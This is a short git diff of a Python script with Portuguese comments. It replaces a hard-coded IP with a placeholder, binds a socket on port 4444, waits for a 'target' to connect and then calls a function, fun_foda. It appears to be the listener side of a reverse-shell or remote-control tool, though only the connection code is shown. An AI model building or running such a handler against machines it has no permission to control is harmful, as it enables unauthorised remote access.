@@ -85,9 +85,11 @@ def fun_foda ():
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('192.168.0.127', 4444))
+#incluir o seu IP/ e a porta que deseja se conectar
+sock.bind(('SEU IP', 4444))
 print (colored('Esperando por conexões: ', 'green'))
 sock.listen(5)
 
 target, ip = sock.accept()
 print(colored('+ Conectado com: ' + str(ip), 'yellow'))
+fun_foda()
